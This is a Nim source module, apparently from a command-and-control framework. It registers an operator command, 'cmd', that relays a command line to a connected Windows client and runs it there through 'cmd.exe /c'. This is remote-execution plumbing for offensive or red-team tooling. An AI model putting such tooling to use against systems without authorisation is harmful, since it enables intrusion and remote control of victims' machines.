import asyncdispatch, strutils, tables

import ../../types
import ../../communication

import ../../../clientTasks/shell

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  let oArgs = originalCommand.split(" ")
  let argsn = len(oArgs)
  let task = await shell.sendTask(server.cli.handlingClient, "cmd.exe /c " & oArgs[1..(argsn - 1)].join(" "))
  
  await task.awaitResponse()

let cmd*: Command = Command(
  execProc: execProc,
  name: "cmd",
  argsLength: 1,
  usage: @["cmd [command]"],
  cliMode: @[ClientInteractMode],
  description: "Run a command via cmd.exe (Windows only)",
  category: CCClientInteraction,
  requiresConnectedClient: true
)